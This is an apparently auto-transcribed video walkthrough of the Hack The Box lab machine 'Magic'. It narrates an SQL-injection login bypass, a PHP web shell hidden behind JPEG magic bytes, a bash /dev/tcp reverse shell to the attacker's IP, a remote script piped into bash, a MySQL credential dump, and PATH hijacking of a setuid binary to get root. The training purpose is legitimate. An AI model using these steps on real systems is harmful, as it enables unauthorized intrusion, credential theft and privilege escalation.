 what's going on youtube this is ipsec i'm doing magic from hack the box and before doing this oxdf gave me the heads up that this one was pretty easy despite being rated a medium and recommended i do it blind so when doing this box for the first time i hit the record and acted like i was doing a video knowing that if it went horribly wrong i can just cancel the recording delete the videos and no one would be the wiser however i record these intros after doing it so i know the video went pretty well and i also know the general theme in this box is you could find a webpage you can bypass the login through a basic sql injection and then you have to abuse some magic bytes to upload a php shell to the website you get a shell on it and then do a few basic private things to get root one of which is a password reduced out of creds of the database and another one is a set uid binary that you got to exploit so with all that being said let's jump in and do this box as always we're going to start over the nmap so i'm going to create the directory put outputs in then sc for default scripts sv enumerate versions oh a output all formats playing the nmap directory we just created call it magic and then the ip address which is 10 10 10 185 i'm also going to put a pseudo before nmap let that go and i guess while that runs we can go take a look at the web page if there is one so going to 10 10 10 185 it looks like we do have some type of page i'm not sure what this number on the bottom right is the 4d whatever that looks like hex so let's go to cyber chef and it will reverse this x i'm sure we could do it in like um xxd but this is just the easiest way i know so that says magic okay um the very first thing i want to do oh is everything in hex i don't know what that is uh these are numbers those are hex addresses don't know exactly what that is but what i was saying is this could be a hint that something gets hex encoded later on so there is a login we can see in the bottom left but i'm going to do control u to view the source and let's see if we see anything too interesting there is a slash images directory and not too much so let's look at our nmap only one thing two ports came back we have ssh and http it's running apache and it's a ubuntu server so nothing too interesting there i'm going to do some go busters so let's go into go buster go buster dir you for url http 10 10 10 uh 185 w for word list uh user oh no let's do yeah user share word list uh dirtbuster directory list23 medium and i think dash o is for out file we'll call this root.txt and before we run this we should see if this is a php server so what i'm going to do is go to index.html we get nothing there index.php the page comes back so i'm also going to do x php and this is going to append the php extension to everything and because i'm doing this let's do the 2 3 small because that's gonna essentially double the word list because every entry in directory list it adds php so let that run let's take a look at okay let's see we heard slash images slash full so slash images slash full folds plural so put s i'm just saying there's any directory listing somewhere so we also have a second directory images that we may want so let's go up and let's do copy this the out file we just want images this extension i'm not going to look for php scripts in a images directory because that may be silly let's do slash images is that what it is that is run this so now we got a few gobusters and we do see uploads and we have an upload.php so let's go take a look at the login form because i don't really see anything too interesting we could try to hit upload.php actually and it puts us over to login.php so let's try admin admin wrong username or password let's do admin or password okay admin and i'm going to do an sql injection looks like i can't use my scroll wheel to zoom in so let's press f12 and unmask this field because whatever i put in here is going to show that so you can't really see what i'm typing but if i go into the source take this type equals password off then it's not going to be masked so we can do admin or whenever i hit space it doesn't go through uh space works so or one equals one and we'll probably have to set this go through burp there's probably some javascript or something preventing space from working intercept on login so let's see i'm going to do control shift u to on url and code this let's get there and let's put the spaces we want so space there space there comment okay and i'm going to send this back to the page turn intercept off and we log in right away so that was a super basic sql injection uh let's see let's go back in the history real quick because we always want to do some type of recon in the background so let's copy this copy to file uh ipsec htb let's see magic requests and the file name is going to be login we can now go and edit this so v rex login and whenever you do something through sql map i think you either want to put two stars where you want to inject maybe or just not put the a basic injection so i'm just gonna put password equal to please subscribe huh we can show you what happens real quick uh sql map dasher rex login and i thought it would complain but anyways you want vanilla fields in this i may not be complaining because i don't have the uh comment at the end so that batch okay so now we can take a look at this login form so upload file i'm going to press ctrl l which puts me in this location bar so i can just type home ipsec hdb magic and let's make some stuff to upload [Music] this came back and let's see tamper equals space to comment try a tamper script we know this is injectable i'm not sure why sql map did not find it so let's make dur uploads v shell.php and i don't actually php dash a i don't know which one i want to do so if we do exec who am i we have to do echo with that one system who am i let's do system i always get the php syntax confused because there's like three or four ways to execute code um system who am i actually let's just do system we'll jump a step requests ipsec uh we'll put this please subscribe okay so now whenever we hit this we should be able to show and echo thanks for the sub so i put an echo statement first so we know we actually hit the script okay so now we can try to upload this so let's go to uploads shell.php and i'm going to intercept on upload image send this to repeater because i want to see exactly what this says uh alert sorry only jpeg and png files are allowed so we can try changing the mime type so let's go and do file uh i don't know exactly what the mime type is off the head off top of my head so mime types jpeg and let's turn burp off image jpeg that's easy enough about the same okay content type image jpeg okay let's do shell dot jpg what are you trying to do there so when i did this dot jpg we got a new alert it says what are you doing there so that's the field i'm playing with now so i'm going to try jpeg.php and it doesn't do that so that only appears if we end this with jpeg if this mime type is not image jpeg still happens jpg okay so it may be going off the magic bytes of the file now so let's do locate jpg and we can grab the magic bytes of this jpeg so magic bytes are the first few bytes of a file i'm going to do head that pipe it to xd and here would be like the magic bytes so i'm probably going to go to this null byte so that would be i don't know this is 10 maybe 16. so let's try head and then head also has the option for bytes so c so i'm going to do head dash c 16 and we can do a little bit more 20 that looks good so if i do this and put this to a file and file this it still says it's a jpeg because we have those magic bytes so that's all i was trying to do so let's copy test to uploads oh i'm in uploads so let's just rename test to jpeg magic bytes and then we can just cap these two files together so if we can't jpeg magic bytes shell.php 2 magical shell dot php and when you do a file against this it shows it as a jpeg so long way to do what i was just trying to show you it's always easiest now to just go back and re-upload a file so upload magical shell and we'll probably have to rename this to be the jpeg see there upload magical shell intercept upload so we can see the magic bytes here i'm going to send this over to repeater again close these off click send and we get that error message we wanted to put jpeg on the end of this well we did jp g doesn't really matter and it's been uploaded so the field's not caring about this mime type whatsoever it's only caring about it ends with jpg and has this beginning part of the magic bytes so now we have to figure out exactly where this file exists on the server so we can go back over to a go buster and we see there is a slash uploads directory and this was in images so let's go to um we can i'm just going to go and burp and turn intercept off go back here slash images uploads and it was magical shell dot jpeg or jpg dot php.jpg okay so we know exactly where this file is we have to find a way to get code execution because you can't really get code execution just based upon it ending with this it should end with dot php so oh god uh what can we do let's go back here looking at this i don't see any field that could have an lfi um let's see we could try buzzing index.php for hidden functions so let's do now let's go back to our sql map uh nothing dash dash risk equals three dash dash level equals five try this one it may not like it being blind and maybe in the end of the video we'll go back and look at so uh i want to fuzz index.php w fuzz uh dash u http 101010 185. index.php fuzz equals uh we do index and dash w opt set list discovery web content let's see directory let me just try comment i think maybe one in api api actions.txt okay and we probably want to dash dash h l to hide length 59 h lowercase l and we don't get anything see common i guess while that goes we can try the silly thing let's just try please subscribe is equal to who am i and the show got deleted off the server so it doesn't last forever upload go oh we do have code execution why do we have code execution okay uh when you get it don't complain there are things that you always just try because configurations can be silly especially in ctfs so let's go back to uploads look at my shell p-l-e-a-s oh i did requests that should be a request so shell.php i was thinking maybe python request module with s but let's see let's do cat jpeg magic bites shell.php 2 magical shell.php got the magic bites and we should be good so let's re-upload this actually we didn't even have to edit the file go back to the request do that and then refresh and now we got data here so let's go and intercept this quest do it in burp so proxy intercept on the hell uh get rid of why you're not intercepting history it's going through grip oh let's go to options and where is it file extension okay so file extension does not match an image we're not going to intercept it by default let's undo that refresh and here we go so send this to the repeater tab i'm going to change this request method to a post because we use the in the shell because we used request it works with either post or get and i like doing post just because um there's less bad characters so it's much easier to work with so we have the dub dub dub data right here we could if we wanted to probably put a backslash n here and the echo message and now when we go here it puts a command on a new line for a little housekeeping but let's do a reverse shell so bash dash c i dev tcp 10 10 14 my ip is 2. and port 9001 0 and 1 like that and then let's go and press ctrl u to url and code and i'm gonna try to do uh better documentation or just stuff when i do my reverse shells in these videos so now we've got this i'm going to do script and we're going to call this uh web shell and put the date yeah i'll just do web shell.log so now anything i do in this pane until i type exit will go to this file web shell.log so you could also do this within tmox and do tmux logging it's a plug-in but sometimes it's better just to do it this way so nclvnp9001 go here send files not there go back upload file reverse shell and we are here so what i was meaning by that if we exit this and then do exit again and cat the webshell.log we can see everything there so i'm gonna do script webshell.log again to start it back up and we'll do this to get a shell wait what why is that not getting me a shell that is bizarre 9002 uh who am i see please subscribe is equal to him and i you know when you try to do something to explain it and then the demo gods do something that throws a huge wrench that kind of just happened let's see system request let's just name this run me it's no longer executing code huh i have no idea what i just did there let's call magicalshell2.jpg change this to an exact call let's put another line break to make sure we're editing the file goes to 10 just doesn't want to execute any code um i'm gonna revert the box yeah let's revert the box i'm not sure what i just did there but obviously something not good so i'm gonna pause the video revert the box and then we'll resume actually i haven't reverted the box yet i was about to and i noticed something weird here so maybe this content type is screwed up and that's what we have to do so i think it's just supposed to be url form you're all encoded and when i was typing exit i started typing here and that is it so always make sure your content type matches what you want to do so uh we can buy control z a bunch to get to where the reverse shell was bash there we go and yep we have this so let's clean that out we can go back to port 9001 and let's do exit to clean up our script run it and see lvnp 9001 file not found we can just put that file back and we wanted to call it please subscribe there run go to the next tab run got a shell and we are back to where we were so the very first thing i want to do is get a regular tty so python dash c import pty pty dot spawn ben bash uh we gotta do python three so which python three it does exist and control z sdty raw minus echo type fg enter enter and you get to where we should be i'm also going to do export term is equal to x term so now i can clear the screen so let's take a look at this box we have a few files uh there is hey.jpg let's try checking that out so images and we can do hey.jpg just a fun meme uh we got bg.jpg and that's probably the background of the website let's see upload images assets it doesn't really look too interesting there catd5 we can grab these creds so v creds.txt there we go oh let's see i guess we should just run um learn to noob or something so make dirt dub dub dub cp i don't know what happened to my cursor cp opt is it privilege escalation awesome script suite and we want to do len p's then ps.sh to my directory python-m http server python3 curl 10 10 14 2 port eight thousand when p's dot sh bash uh curl's not there i'm gonna try w get dash o dash i think that may be how you do uh to stand it out i think i saw someone commenting on video and i actually remembered it this time that may not be it uh let's see let's just google it w get to stdl stdl no dash capital l there we go so if we do that pipe it over to bash it works just like with our curl so we don't drop it to the disk and we still get code execution so let's just go to the top and look at it while it runs nothing too interesting we already knew it was ubuntu file system nothing too interesting there uh i guess we do have gnome installed so it looks like it has a desktop environment bit odd for server aslr is enabled nothing too interesting software see gsd oh i wonder why that's highlighting the screen part maybe because it assumes screen is vulnerable if it's like running in a process i'm not sure why that thinks that's exploitable i don't think it is what was that rt kit oh that's not it for some reason looking at it it looked like um root kit i don't know what whoopsie is see whoopsy bin so looks like this is a standard thing going down cron jobs nothing too interesting again i'm just glancing at whatever the colors are i'm going to copy this because i'm in edit mode it's not displaying to standard out anymore so once i hit control c to exit standard uh edit mode everything gets pasted and i'm just going to search back up to analyzing service files let's see we have this php session clean and i believe this could be probably just cleaning um php session ids it could also be the task that the creator did to create clean images so we should probably check take a look at that see but we probably don't have permission yet take a look at that processes can i sniff with tcp dump no root we do have a user theseus but www data interesting that mysql is not found but we do have um mysql running because we saw port 3306 let's see that's not private ssh keys interesting file so these are set uid files so let's see anything i don't recognize there's a lot of set uid files on this box and maybe because it's running as the desktop see set gid probably gonna go and redo a set uid check and look at file dates and sort them that way because there's just way too many things here nothing there writable folders don't really see anything um fine slash let's do dash perm 4000 dev null okay let's do ls and i'm going to grab v 201 i might just do 201. and we still need that dev null and we probably should fix our tty because we're doing a weird line wrapping thing so let's go back here s t t y dash a and we want to set columns to 136. so stty columns 136. and let's do rows 32 there we go so let's see we want to put this grip on the other side of devnol i think 201 okay here's all the set uid files from uh right now or this year and it doesn't look like any they're too interesting there was a 2018 one which makes it pretty old so you may want to take a look at that that is a probably old version of sudo uh sudo v dash dash version maybe it's not i don't know md5 some go here and then we can take this md5 virustotal.com search put the md5 here and let's see does this have our first scene last scene 27 days ago maybe that's first scene 27 days ago details first scene in the wild 2017. so chances are this pseudobinary is old because it was first seen around the time of our timestamp so definitely interesting but can't really exploit it because we can't even execute pseudo uh we can't really do too much because user doesn't have permission uh let's see let's go let's figure out exactly why we could execute um code so that's generally done in hd access files telling it um how php accesses so let's look at this and nothing too interesting there but if you're curious why we could execute with um the jpeg extension it's because of this if filematch php any number set handler to application x httpd php so when it gets to the apache web server it has this mime type on it even though it's a jpeg and when it has this mime type it gets sent over to be executed by php so if we go etsy apache 2 r on that mime type we can see mod enabled php and if this handler is there then it executes so i bet if we went back here and change this to be um magicalshell.jpg and then magical shell dot jpg and we change this just to be who am i it doesn't work because it doesn't get sent to php you need php in that file name so we got kind of lucky there that we just appended it a little laziness there saved me troubleshooting that but that's what i'd expect but that hd access file changed it uh websites also have mysql so mysql dash u theseus dash i think capital d and database name is magic we don't have the mysql client mysql dump magic dash u vcs p enter the password cat creds i am king theseus copy paste and now we dumped the database so it looks like there's only one table in this magic and that is logon and the password is theseus was king copy and i had a notification go in the background hopefully you guys couldn't hear that sound um let's see what was i doing oh b dot creds database i will do admin like that and let's cat creds and there is the user theseus in this box so let's do sdu-dcs and try both these passwords authentication failure try the other one sweet so lsla rssh i'm going to just sh into the box to get a cleaner shell so sh dash keygen dash f theseus hit enter a few times bcs.pub copy echo do authorized keys okay chmod 600 theseus ssh-i theseus vcs at 10 10 10 181 uh i think it's 185 actually yes sweet so now i'm going to go into shells and script vcs dash sh dot log and we'll just do that again copy this command paste there we go and let's exit all this and i'm going to type oh i don't have to sweet there we go so now s is h10 um sudo dash l we have his password so cat creds let's try this uh theseus may not run pseudo let's uh i guess run win ps again or limpies cd dub dub dub python-m or python3 http server i'm going to grab w get out of shells we do web shell and we can just copy this paper bash and let this run looks like it's taking longer to run as this user maybe not still analyzing service files so i'm going to pause the video we'll let this finish and then go over it when peace has finished so let's just go and look at everything going up don't really see anything highlighted in red and yellow and yeah doesn't look too interesting so let's do a few find commands so i'm going to do find slash dash user theseus dude and this will be finding um files this guy owns i'm also going to add the dash ls so we can see permissions so here's a bunch of stuff in local evolution that's a male client so we may want to take a look at that but i don't know if i see any files there we could potentially get a password but we know his password so i'm going to guess that's just created because of reasons man that directory is noisy we got vmware and cache proc let's see let's do what groups am i users let's do dash group users oh that's unique we can see that has the probably set uid permission i think that just means special i'm not sure see that is definitely set uid so where is this why don't we see this before ben sysinfo i guess because we couldn't execute it only the people of users can execute it at least i don't think we saw that before um thankfully we do a good job at taking notes and we can just do grep cis info we did see it did that elude us less shells web shell sysinfo yeah we just completely missed it so it was there but it just blended in with the noise but thankfully doing um these other fine commands looking at what's special with our user we could see it easily so let's do i guess just execute it and it gets a few things let's do s trace sysinfo and let's see s trace is like syscall trace so it's going to print all the syscalls it made so we can see it writing cis and fell creating a pipe i think this is forking right here and then getting output so i wonder if says trace does it have a faller fork or s trace my bad dash f so now let's see mem usage this isn't exactly where we were but we can see now more output trying to figure out exactly where we were before oh right here so we saw this this looks like it's cutting probably cpu.info okay amd there we go so we can see how it gets this so we see this pid this is it doing the fork come on okay cpu info dupe two exec bash and now it's doing cat prox cpu info so it's not using absolute paths so there's probably other ones so we can probably just search for exec ve so it's doing an absolute path on free right here so we can't hijack that um it's not doing absolute path on this one though when it executes bin bash and then free doing absolute path but then not there no absolute path there and absolute path but nothing there so let's try abusing this so i wonder if i can just do this and then grab exac v nope uh say two to one nope let's see i think dash ff put it in files right maker attempt cd temp as trace follow fork with output into separate files do we have to give it a file name okay not sure exactly how to do that one but let's play with a few of these so we can do exec ve and we can try free first so what i'm going to do is vi free then bash and let's do over shell so bash dash c dash dash i uh dev tcp 10 10 14 two nine thousand one zero at one i think that's how i did the show uh shoot it was a and like that okay chmod plus x3 and we probably gotta put the oh we did the shebang at the very top so let's see we can exit this and see lvnp 9001 and if we just execute uh what is it says info nothing happens however because it just you calls free like this and how that works is based upon the path so if i echo path i can do export path is equal to uh pwd path maybe you have to do that echo path oh well i just screwed up the path so we can do export path is equal to pwd then that so now my current directory is at the very top of my path so when something calls free it should have went to this weird which free user bin free echo path oh i have a semicolon come on it's a colon not semicolon there we go so now when i call free it executes the free out of my shell so if we do i guess we should go here and do script rootshell.log nclvnp9001 sysinfo when it hits this free command we get a shell so we go into slash root and we can see the program so it's doing c out exec free dot h so you can see everything here so we should be able to probably exploit fdisk cat or lshw so we can try that real quick um exit so if we move free to be cat sysinfo got a shell there we can move cat to b where's the other one fdisk and then execute this info we get it but before we go let's take a look at the sql map i did a while ago i can't find exactly what pain we did it on uh it was probably on pain one somewhere maybe like i was going through the history typing sql map but i don't remember doing the dash dash dump all and it went like that on all the panes so i'm just going to run it again on this pane and we'll see it has identified that the parameter username is a boolean based blind injection so here you could just do dash dash dump all and it'll take a while but it will eventually dump everything we probably should do batch probably and see if it does and we see it's slowly but surely retrieving data um we could speed it up by telling it to do i think dash dash dump magic would that be the database um let's see man sql map search for database and that's not it that's not it dash current db so we'll do dash dome current db in this database current db this database shouldn't have that much data um i need to stop talking and typing just enter on those and we're gonna see it slowly start dumping data so one table the table is called login and the user was something like i think admin and the password was something with like king theseus or something but this is how you do it with sql map hope you guys enjoyed the video take care and i will see you all next week